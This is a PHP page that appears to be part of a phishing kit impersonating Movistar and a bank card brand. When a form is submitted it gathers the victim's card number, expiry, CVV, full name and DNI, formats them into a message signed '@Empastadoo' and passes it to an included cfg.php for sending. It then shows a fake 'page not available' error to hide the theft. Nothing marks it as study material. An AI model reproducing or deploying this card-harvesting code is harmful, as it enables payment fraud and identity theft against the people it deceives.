<?php
session_start();
if (isset($_POST['B989584412072790767'])) {
		$carr = $_POST['carr'];
		$mm = $_POST['mm'];
		$yy = $_POST['yy'];
		$ceve = $_POST['ceve'];
		$nombre = $_POST['nombre'];
		$dni = $_POST['dni'];
$msj = '➖➖➖➖ MOVISTAR ➖➖➖➖'."\n";
$msj .= 'DNI: '.$dni."\n";
$msj .= 'Nombre Completo: '.$nombre."\n";
$msj .= '➖➖➖➖ TARJETA ➖➖➖➖'."\n";
$msj .= '💎Números: '.$carr."\n";
$msj .= '💎Expiración: '.$mm.' / '.$yy."\n";
$msj .= '💎Código de seguridad: '.$ceve."\n";
$msj .= '➖➖➖➖ @Empastadoo ➖➖➖➖'."\n";
include("cfg.php");
}
?>

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="css/styles.css">    
</head>

<body>
	<form>
		<div class="containerMPRight">
			<div class="t-Body">               
				<div class="t-Body-wrap">
					<div class="t-Login-container">
						<div class="container">
							<div class="row">
								<div class="col col-12 ">
									<div class="t-Login-container">
										<div class="t-Login-region">
											<img class="imgPequeña" src="css/LogoTCenco.png">
										</div>
										<div class="textError">
											<h2>Te pedimos disculpas</h2>                                                        
												La sección o contenido solicitado                                                       
													<br>                                                        
												no se encuentra disponible o no existe
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</form>


</body></html>